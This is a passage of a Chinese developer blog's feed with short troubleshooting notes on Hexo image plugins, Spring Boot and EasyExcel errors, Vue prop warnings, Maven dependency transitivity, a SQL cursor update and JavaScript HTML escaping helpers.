    <content type="html"><![CDATA[<p>一、插件安装</p><pre><code class="hljs awk">npm install https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CodeFalling/</span>hexo-asset-image --save</code></pre><p>二、打开/node_modules/hexo-asset-image/index.js，将内容更换为下面的代码（划重点，这个不改很大的可能会出问题！！！！）</p><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<span class="hljs-keyword">var</span> cheerio = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cheerio&#x27;</span>);<span class="hljs-comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPosition</span>(<span class="hljs-params">str, m, i</span>) </span>&#123;  <span class="hljs-keyword">return</span> str.split(m, i).join(m).length;&#125;<span class="hljs-keyword">var</span> version = <span class="hljs-built_in">String</span>(hexo.version).split(<span class="hljs-string">&#x27;.&#x27;</span>);hexo.extend.filter.register(<span class="hljs-string">&#x27;after_post_render&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;  <span class="hljs-keyword">var</span> config = hexo.config;  <span class="hljs-keyword">if</span>(config.post_asset_folder)&#123;    <span class="hljs-keyword">var</span> link = data.permalink;<span class="hljs-keyword">if</span>(version.length &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">Number</span>(version[<span class="hljs-number">0</span>]) == <span class="hljs-number">3</span>)   <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<span class="hljs-keyword">else</span>   <span class="hljs-keyword">var</span> beginPos = getPosition(link, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>;<span class="hljs-comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span><span class="hljs-keyword">var</span> endPos = link.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-number">1</span>;    link = link.substring(beginPos, endPos);    <span class="hljs-keyword">var</span> toprocess = [<span class="hljs-string">&#x27;excerpt&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;content&#x27;</span>];    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; toprocess.length; i++)&#123;      <span class="hljs-keyword">var</span> key = toprocess[i];       <span class="hljs-keyword">var</span> $ = cheerio.load(data[key], &#123;        ignoreWhitespace: <span class="hljs-literal">false</span>,        xmlMode: <span class="hljs-literal">false</span>,        lowerCaseTags: <span class="hljs-literal">false</span>,        decodeEntities: <span class="hljs-literal">false</span>      &#125;);      $(<span class="hljs-string">&#x27;img&#x27;</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> ($(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>))&#123;<span class="hljs-comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span><span class="hljs-keyword">var</span> src = $(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>).replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-regexp">/http[s]*.*|\/\/.*/</span>.test(src) &amp;&amp;   !<span class="hljs-regexp">/^\s*\//</span>.test(src)) &#123;  <span class="hljs-comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span>  <span class="hljs-comment">// In addition, to support multi-level local directory.</span>  <span class="hljs-keyword">var</span> linkArray = link.split(<span class="hljs-string">&#x27;/&#x27;</span>).filter(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">elem</span>)</span>&#123;<span class="hljs-keyword">return</span> elem != <span class="hljs-string">&#x27;&#x27;</span>;  &#125;);  <span class="hljs-keyword">var</span> srcArray = src.split(<span class="hljs-string">&#x27;/&#x27;</span>).filter(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">elem</span>)</span>&#123;<span class="hljs-keyword">return</span> elem != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="hljs-string">&#x27;.&#x27;</span>;  &#125;);  <span class="hljs-keyword">if</span>(srcArray.length &gt; <span class="hljs-number">1</span>)srcArray.shift();  src = srcArray.join(<span class="hljs-string">&#x27;/&#x27;</span>);  $(<span class="hljs-built_in">this</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>, config.root + link + src);  <span class="hljs-built_in">console</span>.info&amp;&amp;<span class="hljs-built_in">console</span>.info(<span class="hljs-string">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">console</span>.info&amp;&amp;<span class="hljs-built_in">console</span>.info(<span class="hljs-string">&quot;no src attr, skipped...&quot;</span>);<span class="hljs-built_in">console</span>.info&amp;&amp;<span class="hljs-built_in">console</span>.info($(<span class="hljs-built_in">this</span>));&#125;      &#125;);      data[key] = $.html();    &#125;  &#125;&#125;);</code></pre><p>三、打开_config.yml文件，修改下述内容</p><pre><code class="hljs yaml"><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">true</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>EasyExcel 导入数据出错The index of &#39;xx&#39; and &#39;xx&#39; must be inconsistent</title>
    <link href="/2020/11/06/easyexcel-%E5%AF%BC%E5%85%A5%E6%95%B0%E6%8D%AE%E5%87%BA%E9%94%99the-index-of-xx-and-xx-must-be-inconsistent/index/"/>
    <url>/2020/11/06/easyexcel-%E5%AF%BC%E5%85%A5%E6%95%B0%E6%8D%AE%E5%87%BA%E9%94%99the-index-of-xx-and-xx-must-be-inconsistent/index/</url>
    
    <content type="html"><![CDATA[<p>原因：两个字段的index索引值都是0，导致异常</p><p>错误代码：</p><pre><code class="hljs delphi">@ExcelProperty(<span class="hljs-keyword">index</span> = <span class="hljs-number">0</span>)<span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span>  oneSubjectName;@ExcelProperty(<span class="hljs-keyword">index</span> = <span class="hljs-number">0</span>)<span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span>  twoSubjectName;</code></pre><p>修改后：</p><pre><code class="hljs delphi">@ExcelProperty(<span class="hljs-keyword">index</span> = <span class="hljs-number">0</span>)<span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span>  oneSubjectName;@ExcelProperty(<span class="hljs-keyword">index</span> = <span class="hljs-number">1</span>)<span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span>  twoSubjectName;</code></pre>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>org.springframework.web.multipart.MaxUploadSizeExceededException: Maximum upload size exceeded; nested exception is java.lang.IllegalStateException: org.apache.tomcat.util.http.fileupload.impl.FileSizeLimitExceededException: The field file exceeds its maximum permitted size of 1048576 bytes</title>
    <link href="/2020/11/03/org-springframework-web-multipart-maxuploadsizeexceededexception-maximum-upload-size-exceeded-nested-exception-is-java-lang-illegalstateexception-org-apache-tomcat-util-http-fileupload-impl-filesiz/index/"/>
    <url>/2020/11/03/org-springframework-web-multipart-maxuploadsizeexceededexception-maximum-upload-size-exceeded-nested-exception-is-java-lang-illegalstateexception-org-apache-tomcat-util-http-fileupload-impl-filesiz/index/</url>
    
    <content type="html"><![CDATA[<p>翻译过来的大致意思就是文件大小超了</p><p>解决办法：</p><p>在application.properties中添加如下：<br><code>_#单个文件最大大小_ **spring.http.multipart.maxFileSize**=**20Mb** _#所有上传文件最大大小_ **spring.http.multipart.maxRequestSize**=**1000Mb**</code></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
      <category>springboot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Failed to configure a DataSource: &#39;url&#39; attribute is not specified and no embedded datasource could be configured.</title>
    <link href="/2020/10/30/failed-to-configure-a-datasource-url-attribute-is-not-specified-and-no-embedded-datasource-could-be-configured/index/"/>
    <url>/2020/10/30/failed-to-configure-a-datasource-url-attribute-is-not-specified-and-no-embedded-datasource-could-be-configured/index/</url>
    
    <content type="html"><![CDATA[<h3 id="问题原因："><a href="#问题原因：" class="headerlink" title="问题原因："></a>问题原因：</h3><p>springboot去寻找数据库配置，但由于模块不需要数据库操作所以没有配置数据库</p><h3 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h3><p>1.在application.properties文件中配置数据库信息</p><p>2.在springboot的启动类中加个属性，默认不加载数据库，即：</p><pre><code class="hljs python"><span class="hljs-meta">@SpringBootApplication(<span class="hljs-params">exclude = DataSourceAutoConfiguration.<span class="hljs-keyword">class</span></span>)</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
      <category>springboot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ambiguous mapping. Cannot map &#39;xxxController&#39; method</title>
    <link href="/2020/10/26/ambiguous-mapping-cannot-map-xxxcontroller-method/index/"/>
    <url>/2020/10/26/ambiguous-mapping-cannot-map-xxxcontroller-method/index/</url>
    
    <content type="html"><![CDATA[<p>敲代码的时候犯懒，复制的时候Controller注解的RequestMapping没改。。。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vue warn]: Invalid prop: type check failed for prop &quot;min&quot;. Expected Number with value 0, got String</title>
    <link href="/2020/10/26/vue-warn-invalid-prop-type-check-failed-for-prop-min-expected-number-with-value-0-got-string/index/"/>
    <url>/2020/10/26/vue-warn-invalid-prop-type-check-failed-for-prop-min-expected-number-with-value-0-got-string/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs vim">&lt;<span class="hljs-keyword">el</span>-form-item label=<span class="hljs-string">&quot;排序&quot;</span> prop=<span class="hljs-string">&quot;sort&quot;</span>&gt;        &lt;<span class="hljs-keyword">el</span>-<span class="hljs-built_in">input</span>-<span class="hljs-keyword">number</span> v-model=<span class="hljs-string">&quot;person.sort&quot;</span> controls-position=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-built_in">min</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;&lt;/<span class="hljs-keyword">el</span>-form-item&gt;</code></pre><p>改为：</p><pre><code class="hljs vim">&lt;<span class="hljs-keyword">el</span>-form-item label=<span class="hljs-string">&quot;讲师排序&quot;</span> prop=<span class="hljs-string">&quot;sort&quot;</span>&gt;        &lt;<span class="hljs-keyword">el</span>-<span class="hljs-built_in">input</span>-<span class="hljs-keyword">number</span> v-model=<span class="hljs-string">&quot;teacher.sort&quot;</span> controls-position=<span class="hljs-string">&quot;right&quot;</span> :<span class="hljs-built_in">min</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;&lt;/<span class="hljs-keyword">el</span>-form-item&gt;</code></pre><p>错误原因：min max 之类，使用组件的话应为 :min :max</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>[Vue warn]: Error in created hook: &quot;TypeError: handler.call is not a function&quot;</title>
    <link href="/2020/10/20/vue-warn-error-in-created-hook-typeerror-handler-call-is-not-a-function/index/"/>
    <url>/2020/10/20/vue-warn-error-in-created-hook-typeerror-handler-call-is-not-a-function/index/</url>
    
    <content type="html"><![CDATA[<p>此问题为<strong>调用中生命周期钩子函数引起来的错误，</strong></p><p><strong>解决办法：检查</strong> <strong><strong>生命周期钩子函数</strong></strong> 是否有<strong>未定义方法</strong> 还是 <strong>声名了空的钩子函数；</strong></p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Error starting ApplicationContext. To display the conditions report re-run your application with ‘debug’ enabled</title>
    <link href="/2020/10/14/error-starting-applicationcontext-to-display-the-conditions-report-re-run-your-application-with-debug-enabled/index/"/>
    <url>/2020/10/14/error-starting-applicationcontext-to-display-the-conditions-report-re-run-your-application-with-debug-enabled/index/</url>
    
    <content type="html"><![CDATA[<p>@RequestMapping 写错了或者端口冲突</p>]]></content>
    
    
    <categories>
      
      <category>springboot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>There is already &#39;xxxController&#39; bean method解决办法</title>
    <link href="/2020/10/14/there-is-already-xxxcontroller-bean-method%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/index/"/>
    <url>/2020/10/14/there-is-already-xxxcontroller-bean-method%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/index/</url>
    
    <content type="html"><![CDATA[<p>报这个错的原因是因为你controller里的@RequestMapping中的路径有重复！</p>]]></content>
    
    
    <categories>
      
      <category>springboot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>maven依赖传递性</title>
    <link href="/2020/09/20/maven%E4%BE%9D%E8%B5%96%E4%BC%A0%E9%80%92%E6%80%A7/index/"/>
    <url>/2020/09/20/maven%E4%BE%9D%E8%B5%96%E4%BC%A0%E9%80%92%E6%80%A7/index/</url>
    
    <content type="html"><![CDATA[<h2 id="依赖传递性"><a href="#依赖传递性" class="headerlink" title="依赖传递性"></a>依赖传递性</h2><p>在项目往往需要引入多个依赖， 而引入的依赖又会引入其他的依赖。</p><p>例如： 项目中引入了spring-core依赖， 而spring-core又依赖commons-logging。因为项目直接引入了spring-core依赖，则spring-core为项目的第一直接依赖， 而因为spring-core引入了commons-logging依赖， 则commons-logging为项目的一个传递性依赖。Maven会解析各个直接依赖的POM, 将那些必要的间接依赖，以传递性依赖的形式引入到当前的项目中。</p><h2 id="传递性依赖和依赖范围"><a href="#传递性依赖和依赖范围" class="headerlink" title="传递性依赖和依赖范围"></a>传递性依赖和依赖范围</h2><p>依赖范围不仅可以控制依赖和三种classpath的关系，还对传递性依赖产生影响。</p><p>假设A依赖B， B依赖C, 我们说A对于B是第一直接依赖， B对C是第二直接依赖， A对于C是传递性依赖。 第一直接依赖的范围和第二直接依赖的范围决定了传递性依赖的范围。 如下图： 最左边一列表示第一直接依赖方位， 最上面一行表示第二直接依赖范围， 中间交叉单元格则表示传递性依赖的范围。</p><table><tbody><tr><td>&nbsp;</td><td>compile</td><td>test</td><td>provided</td><td>runtime</td></tr><tr><td>compile</td><td>compile</td><td>---</td><td>---</td><td>runtime</td></tr><tr><td>test</td><td>test</td><td>---</td><td>---</td><td>test</td></tr><tr><td>provided</td><td>provided</td><td>---</td><td>provided</td><td>provided</td></tr><tr><td>runtime</td><td>runtime</td><td>---</td><td>---</td><td>runtime</td></tr></tbody></table><p>当第二直接依赖的范围是compile的时候，传递性依赖与第一直接依赖的范围一致； 当第二直接依赖的范围是test的时候，依赖不会得以传递；当第二直接依赖是provided的时候，值传递第一直接依赖范围也为provided的依赖，且传递性依赖范围同样为provided; 当第二依赖的范围是runtime的时候，传递性范围与第一直接依赖的范围一致，但compile例外，此时传递性依赖的范围为runtime。</p><h2 id="依赖调解"><a href="#依赖调解" class="headerlink" title="依赖调解"></a>依赖调解</h2><p>Maven引入的传递性依赖机制，一方面大大简化和方便了依赖声明，另一方面，大部分情况下我们只需要关系项目的直接依赖是什么，而不用考虑这些直接依赖会引入什么传递性依赖。但有时候，当传递性依赖造成问题的时候，我们就需要清楚得知道该传递性依赖是从哪条依赖路径引入的。</p><p>例如， 项目A有这样的依赖关系：A-&gt;B-&gt;C-&gt;X(1.0), A-&gt;D-&gt;X(2.0), X是A的传递性依赖，但是两条依赖路径上有两个版本的X, 那么哪个X会被Maven解析使用呢？两个版本都解析显然是不对的，因为那会造成依赖重复，因此必须选择一个。Maven依赖调解的第一原则是：路径最近者优先。该例中X(1.0)的路径长度为3，而X(2.0)的路径长度为2，因此X(2.0)会被解析使用。</p><p>依赖调解第一原则不能解决所有问题，比如这样的依赖关系： A-&gt;B-&gt;Y(1.0), A-&gt;C-&gt;Y(2.0), Y(1.0) 和 Y(2.0)的依赖路径长度是一样的，都为2,。 那么到底谁会被解析使用呢？在Maven2.0.8及之前的版本中，这是不确定的， 但是从Maven2.0.9开始，为了尽可能避免构建的不确定性，Maven定义了依赖调解的第二原则：第一声明者优先。在依赖路径长度相同的情况下，在POM中依赖声明的顺序决定了谁会被解析使用，顺序最靠前的那个依赖优胜。该例中，如果B的依赖声明在C之前，那么Y(1.0)就会被解析使用。</p><h2 id="可选依赖"><a href="#可选依赖" class="headerlink" title="可选依赖"></a>可选依赖</h2><p>假设有这样一个依赖关系，项目A依赖与项目B,项目B依赖于项目X和Y, B对于X和Y的依赖都是可选依赖： A-&gt;B, B-&gt;X(可选)，</p><p>B-&gt;Y(可选)。 根据传递性依赖的定义，如果所有这三个依赖的范围都是compile,那么X, Y就是A的compile范围传递性依赖。然而，由于这里X,Y是可选依赖，依赖将不会得以传递。换句话说，X,Y将不会对A有任何影响。</p><p>为什么要使用可选依赖这一特性呢？可能项目B实现了两个特性，其中的特性一依赖于X,特性而依赖于Y,而且两个特性时互斥的，用户不能同时使用两个特性。比如B是一个持久层隔离工具包，它支持多种数据库，报错MySQL, PostgreSQL等，在构建这个工具包的时候， 需要这两种数据库的驱动程序，但在使用这个工具包的时候，只会依赖一种数据库。项目B的依赖声明如下：</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.4-701.jgbc3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre><p>上述代码片段中， 使用<code>&lt;optional&gt;</code>元素表示mysql-connector-java和postgresql这两个依赖为可选依赖，它们只会对当前项目B产生影响，当其他项目依赖于B的时候，这两个依赖不会被传递。因此，当项目A依赖于项目B的时候，如果其实际使用基于MySQL数据，那么项目A中就需要显示的声明mysql-connetor-java这一依赖，如下：</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.rogueq.mvnbook<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>project-b<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>js 数组去空值死值</title>
    <link href="/2020/09/17/js-%E6%95%B0%E7%BB%84%E5%8E%BB%E7%A9%BA%E5%80%BC%E6%AD%BB%E5%80%BC/index/"/>
    <url>/2020/09/17/js-%E6%95%B0%E7%BB%84%E5%8E%BB%E7%A9%BA%E5%80%BC%E6%AD%BB%E5%80%BC/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs javascript"><span class="hljs-built_in">Array</span>.prototype.notempty = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">var</span> arr = [];            <span class="hljs-built_in">this</span>.map(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">val, index</span>) </span>&#123;                <span class="hljs-comment">//过滤规则为，不为空串、不为null、不为undefined，也可自行修改</span>                <span class="hljs-keyword">if</span> (val !== <span class="hljs-string">&quot;&quot;</span> &amp;&amp; val != <span class="hljs-literal">undefined</span>) &#123;                    arr.push(val);                &#125;            &#125;);            <span class="hljs-keyword">return</span> arr;        &#125;</code></pre><p><strong>prototype</strong>函数允许您向Array()对象添加新属性和方法。构造属性时，将为所有数组提供属性及其值，作为默认值。构造方法时，所有数组将使用此方法。<strong>注意</strong>： Array.prototype不是指单个数组，而是指Array()对象本身。<strong>注意</strong>： <strong>prototype</strong>是一个全局对象构造函数，可用于所有JavaScript对象。</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql给字段循环赋随机值</title>
    <link href="/2020/09/17/sql%E7%BB%99%E5%AD%97%E6%AE%B5%E5%BE%AA%E7%8E%AF%E8%B5%8B%E9%9A%8F%E6%9C%BA%E5%80%BC/index/"/>
    <url>/2020/09/17/sql%E7%BB%99%E5%AD%97%E6%AE%B5%E5%BE%AA%E7%8E%AF%E8%B5%8B%E9%9A%8F%E6%9C%BA%E5%80%BC/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@PKey</span> <span class="hljs-type">bigint</span>    <span class="hljs-comment">--声明@PKey</span><span class="hljs-keyword">DECLARE</span> PKey_cursor <span class="hljs-keyword">CURSOR</span> <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">SELECT</span> PKey <span class="hljs-keyword">FROM</span> tableName <span class="hljs-comment">--声明游标</span><span class="hljs-keyword">OPEN</span> PKey_cursor<span class="hljs-keyword">FETCH</span> NEXT <span class="hljs-keyword">FROM</span> PKey_cursor<span class="hljs-keyword">INTO</span> <span class="hljs-variable">@PKey</span>WHILE @<span class="hljs-variable">@FETCH</span>_STATUS <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-comment">--获取游标</span><span class="hljs-keyword">BEGIN</span>UPDATE    tableName<span class="hljs-keyword">SET</span>    fieldA    <span class="hljs-operator">=</span>   <span class="hljs-string">&#x27;编号&#x27;</span><span class="hljs-operator">+</span><span class="hljs-built_in">CAST</span>(PKEY  <span class="hljs-keyword">AS</span>  <span class="hljs-type">VARCHAR</span>)    <span class="hljs-operator">+</span><span class="hljs-string">&#x27;-&#x27;</span>    <span class="hljs-operator">+</span><span class="hljs-built_in">CAST</span>(<span class="hljs-built_in">FLOOR</span>(RAND()<span class="hljs-operator">*</span><span class="hljs-number">100</span>) <span class="hljs-keyword">AS</span>  <span class="hljs-type">VARCHAR</span>)    <span class="hljs-comment">-- 值  cast(floor(rand()*100) as varchar)是取100以内随机整数</span><span class="hljs-keyword">WHERE</span>    PKEY    <span class="hljs-operator">=</span>   <span class="hljs-variable">@PKEY</span>   <span class="hljs-comment">-- 改库</span><span class="hljs-keyword">FETCH</span> NEXT <span class="hljs-keyword">FROM</span> PKey_cursor <span class="hljs-keyword">INTO</span> <span class="hljs-variable">@PKey</span><span class="hljs-keyword">END</span><span class="hljs-keyword">CLOSE</span> PKey_cursor;<span class="hljs-keyword">DEALLOCATE</span> PKey_cursor;</code></pre>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前端编解码js</title>
    <link href="/2020/09/17/%E5%89%8D%E7%AB%AF%E7%BC%96%E8%A7%A3%E7%A0%81js/index/"/>
    <url>/2020/09/17/%E5%89%8D%E7%AB%AF%E7%BC%96%E8%A7%A3%E7%A0%81js/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs arcade"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">html_encode</span>(<span class="hljs-params">str</span>) </span>&#123;    <span class="hljs-keyword">var</span> s = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">if</span> (str.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;    s = str.replace(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&quot;&amp;amp;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&quot;&amp;lt;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&quot;&amp;gt;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/ /g</span>, <span class="hljs-string">&quot;&amp;nbsp;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/\&#x27;/g</span>, <span class="hljs-string">&quot;&amp;#39;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/\&quot;/g</span>, <span class="hljs-string">&quot;&amp;quot;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);    <span class="hljs-keyword">return</span> s;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">html_decode</span>(<span class="hljs-params">str</span>) </span>&#123;    <span class="hljs-keyword">var</span> s = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">if</span> (str.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;    s = str.replace(<span class="hljs-regexp">/&amp;amp;/g</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/&amp;lt;/g</span>, <span class="hljs-string">&quot;&lt;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/&amp;gt;/g</span>, <span class="hljs-string">&quot;&gt;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/&amp;nbsp;/g</span>, <span class="hljs-string">&quot; &quot;</span>);    s = s.replace(<span class="hljs-regexp">/&amp;#39;/g</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/&amp;quot;/g</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>);    s = s.replace(<span class="hljs-regexp">/&lt;br\/&gt;/g</span>, <span class="hljs-string">&quot;\n&quot;</span>);    <span class="hljs-keyword">return</span> s;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>浏览器存储（cookie、localStorage、sessionStorage）</title>
    <link href="/2020/08/19/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8%EF%BC%88cookie%E3%80%81localstorage%E3%80%81sessionstorage%EF%BC%89/index/"/>
    <url>/2020/08/19/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8%EF%BC%88cookie%E3%80%81localstorage%E3%80%81sessionstorage%EF%BC%89/index/</url>
    
